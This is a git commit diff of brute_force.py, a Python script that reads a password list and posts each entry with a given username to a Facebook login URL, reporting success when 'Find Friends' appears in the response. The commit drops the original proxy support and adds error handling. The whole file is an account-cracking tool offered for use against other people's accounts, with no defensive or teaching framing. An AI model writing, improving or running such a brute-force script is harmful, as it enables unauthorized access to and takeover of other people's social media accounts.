5cfdbbb7800d23afcf0f0d8f7683213ad3383f59
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-21 17:27:35 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,34 +1,34 @@
 import requests
 
-def brute_force(username, fb_id, passwords, proxy):
-    for password in passwords:
-        session = requests.Session()
-        session.proxies = {'http': proxy, 'https': proxy}
+def brute_force(username, fb_id, passwords):
+    login_url = f'https://www.facebook.com/{fb_id}'
+    
+    with requests.Session() as session:
+        for password in passwords:
+            data = {
+                'email': username,
+                'pass': password,
+                'login': 'Log In'
+            }
 
-        data = {
-            'email': username,
-            'pass': password
-        }
+            try:
+                response = session.post(login_url, data=data)
+                if 'Find Friends' in response.text:
+                    print(f'Successful login! Username: {username}, Password: {password}')
+                    break
+            except requests.RequestException as e:
+                print(f'Error during login attempt: {e}')
 
-        response = session.post(f'https://www.facebook.com/{fb_id}', data=data)
-
-        if 'Find Friends' in response.text:
-            print(f'Success! Password found: {password}')
-            break
-
-def main():
-    username = input('Podaj nazwę użytkownika: ')
-    fb_id = input('Podaj identyfikator Facebooka: ')
-    password_file = input('Podaj nazw pliku z listą haseł: ')
-    proxy = 'http://user123:pass456@192.168.0.1:8080'  # Replace with your proxy details
+if __name__ == "__main__":
+    username = input("Enter username/email: ")
+    fb_id = input("Enter Facebook ID: ")
+    password_file = input("Enter the name of the password file: ")
 
     with open(password_file, 'r') as file:
         passwords = [line.strip() for line in file]
 
-    brute_force(username, fb_id, passwords, proxy)
+    brute_force(username, fb_id, passwords)
 
-if __name__ == "__main__":
-    main()
 
 
 
